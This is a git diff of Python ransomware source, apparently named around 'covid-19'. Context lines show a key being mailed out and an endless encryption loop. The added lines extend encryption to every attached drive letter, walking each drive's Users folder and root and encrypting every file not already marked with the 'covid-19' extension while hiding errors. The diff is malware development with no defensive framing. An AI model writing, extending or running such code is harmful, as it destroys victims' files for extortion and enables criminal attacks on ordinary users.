@@ -73,6 +73,10 @@ def send_key():
 # CALL THE FUNCTION TO SEND THE MAIL
 send_key()
 
+# ADD ALL LETTER FOR POSSIBLE DRIVES
+all_drives = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+drives     = []
+
 # FOR EVERYTIME ENCRYPTING FILES ON THE SYSTEM
 while True:
     # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
@@ -95,3 +99,27 @@ while True:
                                     pass
                                 except:
                                     pass
+                                
+    # GET THE LETTER OF EVERY DISK INTO THE SYSTEM
+    for letter in all_drives:
+        if os.path.isdir(letter + ':\\'):
+            drives.append(letter + ":")
+    # ADD PATH TO ENCRYPT OF EVERY DISK INTO THE SYSTEM
+    for drive in drives:
+        rep = ["{}\\Users\\".format(drive)]
+        if drive != letter_drive:
+            rep.append(drive + "\\")
+            for letter in rep:
+                for root, dir, files in os.walk(letter):
+                    for file in files:
+                        for ext in file.split("."):
+                            if file.endswith(ext):
+                                my_ext = ["covid-19"]
+                                if not(ext in my_ext):
+                                    try:
+                                        full_path = os.path.join(root, file)
+                                        file_encrypt(key, full_path)
+                                    except PermissionError:
+                                        pass
+                                    except:
+                                        pass
